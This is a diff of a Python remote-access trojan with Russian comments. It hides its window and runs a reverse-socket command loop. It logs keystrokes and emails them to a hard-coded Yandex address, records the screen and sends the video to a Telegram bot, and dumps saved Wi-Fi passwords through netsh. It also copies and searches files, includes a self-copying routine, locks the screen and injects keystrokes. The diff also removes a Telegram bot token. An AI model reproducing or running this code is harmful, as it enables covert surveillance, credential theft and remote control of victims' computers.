@@ -1,18 +1,4 @@
-from os import system
-"""system("pip install datetime")
-system("pip install pynput")
-system("pip install shutil")
-system("pip install pypi-stat")
-system("pip install keyboard")
-system("pip install smtplib")
-system("pip install email")
-system("pip install emails")
-system("pip install sockets")
-system("pip install subprocess")
-system("pip install mimetypes")
-system("pip install requests")
-system("pip install pywifi")"""
-import time
+import os, time
 import datetime
 from pynput.keyboard import Listener
 from pynput import keyboard
@@ -24,19 +10,16 @@ from email.mime.image import MIMEImage  # Изображения
 from email.mime.multipart import MIMEMultipart  # Многокомпонентный объект
 from email.mime.text import MIMEText  # Текст/HTML
 
-#from tkinter import Tk, Entry, Label
-import pyautogui
 import socket, subprocess, mimetypes, requests
 from pywifi import *
 from requests import get
 
-#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = socket.getaddrinfo(socket.gethostname(), None)
 ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
-#print(ipv4_addresses)
-ip = "192.168.56.1"
+# print(ipv4_addresses)
+ip = "192.168.0.12"
 reconect = False
-
 
 def h1de():
     try:
@@ -77,7 +60,6 @@ def h1de():
 
 h1de()
 
-
 def wa1ting(ip="192.168.0.12", s=None, it=0):
     del s
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -97,32 +79,6 @@ def wa1ting(ip="192.168.0.12", s=None, it=0):
         print("\nConnected")
         return [ip, s]
 
-def check_wifi():
-    s1 = str(socket.gethostbyname(socket.gethostname()))
-    s1 = s1.split(".")
-    s1[3] = "0"
-    s1 = ".".join(s1)
-    for i in range(1001):
-        i = 212
-        s1 = s1.split(".")
-        s1[3] = str(i)
-        s1 = ".".join(s1)
-        subprocess.getoutput("chcp 65001")
-        req = subprocess.getoutput("ping " + s1)
-        print(s1 + "\n" + req + "\n")
-        if "Destination host unreachable" in req or "Request timed out" in req:
-            pass
-        else:
-            sock, s = wa1ting(ip=s1)
-            print(s1)
-            if sock == None:
-                pass
-            else:
-                return [sock, s]
-
-ip, s = check_wifi()
-#ip = check_wifi()
-
 def scan_wifi():
     wifi = PyWiFi()
     ifaces = wifi.interfaces()[0]
@@ -136,6 +92,7 @@ def scan_wifi():
     tmp_profile = ifaces.add_network_profile(profile)  # Файл конфигурации загрузки
     ifaces.connect(tmp_profile)  # connect
     time.sleep(10)
+
 
 def wait(ip, data, main_data):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -173,11 +130,13 @@ def prepare():
             line = "".join("".join(line.split(" ")[-1]).split("\r"))
             data.append(line)
             dAta.append(line)
-    #ip = wait(ip="192.168.0.12", data=data, main_data=dAta)
+    # ip = wait(ip="192.168.0.12", data=data, main_data=dAta)
+
 
 global end_dt
 global perm_dt
 perm_dt = 1
+
 
 def waiting(ip="192.168.0.12", s=None):
     global end_dt
@@ -195,6 +154,7 @@ def waiting(ip="192.168.0.12", s=None):
         return s
     else:
         return s
+
 
 def show_ip(lp=None, public_ip=None):
     try:
@@ -271,14 +231,14 @@ def video(tm, timer):
             out.write(frame)
             if to == -1:
                 to = (tm.split("_")[-1])
-                #print(int(to.split("=")[-1]))
-            #op = float(((str(datetime.datetime.now())).split(" ")[-1]).split(":")[-1])
+                # print(int(to.split("=")[-1]))
+            # op = float(((str(datetime.datetime.now())).split(" ")[-1]).split(":")[-1])
             if int(time.perf_counter() - int(to.split("=")[-1])) > timer:
-                #print(op)
+                # print(op)
                 break
         except:
             break
-    #cv2.destroyAllWindows()
+    # cv2.destroyAllWindows()
     out.release()
     return tm + ".avi"
 
@@ -286,16 +246,19 @@ def video(tm, timer):
 def kboard(com):
     def writeing_to_the_keyboard(text):
         keyboard.write(text)
+
     def hotk(key, text):
         keyboard.add_hotkey(key, lambda: keyboard.write(text))
+
     if "writeing" in com:
         writeing_to_the_keyboard((com.split("#")[-1]).split("|")[-1])
     elif "hotk" in com:
         hotk(com.split("|")[1], com.split("|")[-1])
 
-def v1deo(tm, s=None, ip=None):
+
+def v1deo(tm, s=None, ip="192.168.0.12"):
     import pyautogui
-    #screen = pyautogui.screenshot("screenshot.png")
+    # screen = pyautogui.screenshot("screenshot.png")
 
     import cv2, pyautogui
     import numpy as np
@@ -324,32 +287,31 @@ def v1deo(tm, s=None, ip=None):
         except KeyboardInterrupt as e:
             out.release()
             send_video(str(tm) + ".avi")
-            os.remove(str(tm) + ".avi")
-            #print(str(tm) + ".avi")
+            # print(str(tm) + ".avi")
             print(e)
             exit(1)
-            #break
+            # break
         except:
             break
-    #cv2.destroyAllWindows()
+    # cv2.destroyAllWindows()
     out.release()
     return str(tm) + ".avi", s
+
 
 def send_video(path='output.avi'):
     global message
     global bot
     import telebot
-    bot = telebot.TeleBot('5158577409:AAE9OzHkFI-rKICyZTyPgH4yZnRdIEOsH9s') # token
+    bot = telebot.TeleBot('')  # token
 
     @bot.message_handler(commands=['stp'])
     def stop_command():
-        #print("ok")
+        # print("ok")
         bot.stop_polling()
 
-    bot.send_video(1251720329, video=open(path, 'rb'), supports_streaming=True)
-    #bot.send_video(0, video=open(path, 'rb'), supports_streaming=True)
+    bot.send_video(0, video=open(path, 'rb'), supports_streaming=True)  # first parameter is your telegram id
     stop_command()
-    #bot.polling(none_stop=False, interval=0)
+    # bot.polling(none_stop=False, interval=0)
 
 
 try:
@@ -357,16 +319,18 @@ try:
 except:
     s.close()
     perm_dt = str(datetime.datetime.now())
-    perm_dt = perm_dt.replace(":", "=")
+    per = perm_dt.split(" ")[-1]
+    per = "=".join(per.split(":"))
+    perm_dt = perm_dt.split(" ")
+    perm_dt[-1] = per
+    perm_dt = " ".join(perm_dt)
     _ = perm_dt
-    w = v1deo(_, ip=ip)
+    w = v1deo(_)
     pathr = w[0]
     s = w[1]
     send_video(pathr)
-    os.remove(pathr)
-    #s = waiting(ip, s)
+    # s = waiting(ip, s)
 subprocess.getoutput("chcp 65001")
-s.send((subprocess.getoutput("cd")).encode("utf-8"))
 
 
 def ch_dir(dir):
@@ -384,7 +348,7 @@ def tr():
             Wi_Fis.append(line.split(':')[1][1:-1])
 
     for Wi_Fi in Wi_Fis:
-        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', Wi_Fi, 'key=clear']).decode('cp866').\
+        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', Wi_Fi, 'key=clear']).decode('cp866'). \
             split('\n')
         for line in results:
             if "Key Content" in line:
@@ -398,15 +362,17 @@ def tr():
         qy.append("Нет ни одного подключения.")
     return "\n".join(qy)
 
+
 def cpy(path, main_path):
     path = (path.split("\\"))[-1]
     subprocess.getoutput("copy " + path + " " + main_path + "\\" + path)
 
+
 def wlk(dir, main_path):
     for name in os.listdir(dir):
         path = os.path.join(dir, name)
-        if os.path.isfile(path):  # если файл, ...
-             cpy(name, main_path) # создать функцию переноса в папку
+        if os.path.isfile(path):  # если файт, ...
+            cpy(name, main_path)  # создать функцию переноса в папку
         else:  # если папка, ...
             wlk(path, main_path)
 
@@ -457,6 +423,7 @@ def wolk(dir, file, checked=[], flag=False):
         except Exception as e:
             return str(e) + "=>\n=> No files", []
 
+
 def py_to_exe(file):
     """with open(file + ".py", "w") as tr:
         tr.write()"""
@@ -477,8 +444,8 @@ def py_to_exe(file):
     os.chdir(folder)
     os.chdir("dist")
 
-def keylog():
 
+def keylog():
     logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(message)s")
 
     def on_press(key):
@@ -495,6 +462,7 @@ def keylog():
     with Listener(on_press=on_press) as listener:
         listener.join()
     send_email("verart1@yandex.ru", "keylog.txt")
+
 
 def walk(msg, dir):  # парсер директорий
     names = []
@@ -516,39 +484,38 @@ def virus(python):  # основная функция самокопирован
     original_code = ""  # вводим переменную для исходного кода атакуемого файла
     for line in file:
         original_code += line  # построчно вводим код в переменную
-    #file.close()
+    # file.close()
     return original_code
 
 
 def send_email(addr_to, f1le, msg_subj="Test", msg_text="hello"):
     msg = MIMEMultipart()
-    addr_from = ""                      # Отправитель
-    password = ""                                # Пароль
+    addr_from = ""  # Отправитель
+    password = ""  # Пароль
 
-    #msg = MIMEMultipart()                                   # Создаем сообщение
-    msg['From'] = addr_from                              # Адресат
-    msg['To'] = addr_to                                # Получатель
-    msg['Subject'] = msg_subj                               # Тема сообщения
+    # msg = MIMEMultipart()                                   # Создаем сообщение
+    msg['From'] = addr_from  # Адресат
+    msg['To'] = addr_to  # Получатель
+    msg['Subject'] = msg_subj  # Тема сообщения
 
-    body = msg_text                                         # Текст сообщения
-    msg.attach(MIMEText(body, 'plain'))                     # Добавляем в сообщение текст
+    body = msg_text  # Текст сообщения
+    msg.attach(MIMEText(body, 'plain'))  # Добавляем в сообщение текст
 
-
-
-    #process_attachement(msg, files)
+    # process_attachement(msg, files)
     try:
         atach_file(msg, f1le)
     except:
         pass
 
-    #======== Этот блок настраивается для каждого почтового провайдера отдельно ===============================================
-    server = smtplib.SMTP_SSL('smtp.mail.ru')        # Создаем объект SMTP
-    #server.starttls()                                      # Начинаем шифрованный обмен по TLS
-    #server.set_debuglevel(True)                            # Включаем режим отладки, если не нужен - можно закомментировать
-    server.login(addr_from, password)                       # Получаем доступ
-    server.send_message(msg, from_addr=addr_from, to_addrs=addr_to)                            # Отправляем сообщение
-    server.quit()                                           # Выходим
-    #==========================================================================================================================
+    # ======== Этот блок настраивается для каждого почтового провайдера отдельно ===============================================
+    server = smtplib.SMTP_SSL('smtp.mail.ru')  # Создаем объект SMTP
+    # server.starttls()                                      # Начинаем шифрованный обмен по TLS
+    # server.set_debuglevel(True)                            # Включаем режим отладки, если не нужен - можно закомментировать
+    server.login(addr_from, password)  # Получаем доступ
+    server.send_message(msg, from_addr=addr_from, to_addrs=addr_to)  # Отправляем сообщение
+    server.quit()  # Выходим
+    # ==========================================================================================================================
+
 
 def atach_file(msg, filepath):
     ctype, encoding = mimetypes.guess_type(filepath)
@@ -576,46 +543,17 @@ password = ""
 dest_email = "verart1@yandex.ru"
 
 
-
-"""ip_addr = []
-ip_addrs = []
-perm_ip_addrs = []
-macs = []
-perm_macs = []
-types = []
-perm_types = []
-flag = False
-your = False
-s = str(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
-for line in subprocess.getoutput("arp -a"):
-    if your:
-        if "interface" in line.lower():
-            your = False
-        pass
-    elif s in line.lower():
-        your = True
-    elif "interface" in line.lower():
-        ip_addr.append(line.split(" ")[1])
-    elif "internet address" in line.lower():
-        if not flag:
-            ip_addrs.append(perm_ip_addrs)
-            macs.append(perm_macs)
-            types.append(perm_types)
-            perm_types = []
-            perm_macs = []
-            perm_ip_addrs = []
-        flag = True
-    else:
-        perm_macs.append(line.split(" ")[1])
-        ip_addrs.append(line.split(" ")[0])
-        types.append(line.split(" ")[-1])
-ip_addrs.append(perm_ip_addrs)
-macs.append(perm_macs)
-types.append(perm_types)
-del perm_ip_addrs
-del perm_types
-del perm_macs
-return ip_addr, ip_addrs, macs, types"""
+def read_file(python):
+    filepath = os.path.abspath(python)
+    #ctype, encoding = mimetypes.guess_type(filepath)
+    maintype, subtype = ctype.split('/', 1)  # Получаем тип и подтип
+    with open(python, "r", encoding='utf-8') as file:  # снова читаем атакуемый файл
+        original_code = ""  # вводим переменную для исходного кода атакуемого файла
+        for line in file:
+            original_code += line  # построчно вводим код в переменную
+        # print(original_code)
+        file.close()
+    return original_code
 
 def find_file(path, d="max"):
     max_flag = False
@@ -641,13 +579,11 @@ def find_file(path, d="max"):
         pr = ["No files"]
     return pr
 
-def lock(pas):
+def lock(pas="User"):
     import pyautogui
     from tkinter import Tk, Entry, Label
     from pyautogui import click, moveTo
     from time import sleep
-    root = Tk()
-    root.update()
 
     def callback(event):
         global k, entry
@@ -683,23 +619,9 @@ def lock(pas):
     else:
         root.destroy()
 
-def read_file(python):
-    filepath = os.path.abspath(python)
-    ctype, encoding = mimetypes.guess_type(filepath)
-    #maintype, subtype = ctype.split('/', 1)  # Получаем тип и подтип
-    """with open(python, "r", encoding='utf-8') as file:  # снова читаем атакуемый файл
-        original_code = ""  # вводим переменную для исходного кода атакуемого файла
-        for line in file:
-            original_code += line  # построчно вводим код в переменную
-    #print(original_code)
-        file.close()"""
-    f = open(python, "r", encoding="utf-8")
-    original_code = f.read()
-    f.close()
-    return original_code
 
-#print("\n" + s.recv(1024).decode("utf-8"))
-#print(s.recv(1024).decode())
+s.send((subprocess.getoutput("cd")).encode())
+print(s.recv(1024).decode())
 while 1:
     try:
         if not reconect:
@@ -801,6 +723,11 @@ while 1:
             path = find_file(spl[1])
             path = "\n".join(path)
             s.send(path.encode("utf-8"))
+        elif "lock" == command.split(" ")[0]:
+            if len(command.split(" ")) == 2:
+                lock(pas=(command.split(" ")[-1]))
+            else:
+                lock()
         elif "start" == command.split(" ")[0]:
             os.startfile((command.split(" "))[-1])
             s.close()
